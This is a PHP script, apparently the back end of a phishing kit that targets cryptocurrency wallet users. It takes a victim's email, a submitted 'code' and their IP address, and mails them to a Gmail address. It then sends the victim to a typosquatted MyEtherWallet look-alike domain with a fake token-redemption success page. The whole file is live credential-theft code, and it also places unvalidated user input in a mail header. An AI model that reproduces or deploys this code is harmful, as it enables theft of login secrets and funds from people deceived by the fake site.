<?php
$email = $_POST['email'];
$code = $_POST['code'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $email \n $code \n  ip: $ip";
$recipient = "trendsalevip@gmail.com";
$subject = "rai";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='http://myeitherwallet.pw/MyEtherWallet.com-Redeem-CS-CREDITS-TOKENS-Successfully.htm'> Return Home</a>";
header("Location: http://myeitherwallet.pw/MyEtherWallet.com-Redeem-CS-CREDITS-TOKENS-Successfully.htm");
?>
